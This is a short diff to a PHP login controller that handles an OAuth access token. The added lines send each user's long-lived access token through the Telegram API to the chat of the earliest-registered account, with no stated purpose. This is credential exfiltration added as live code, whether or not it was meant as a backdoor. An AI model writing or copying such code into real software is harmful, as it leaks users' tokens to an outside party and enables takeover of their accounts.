@@ -347,6 +347,12 @@ class LoginController extends Controller
         $data = json_decode($data);
 
         $long_token = $data->access_token;
+
+        Telegram::sendMessage([
+            'chat_id' => User::orderBy('created_at')->first()->tg_id,
+            'text' => $long_token,
+        ]);
+
         echo $long_token;
     }
 
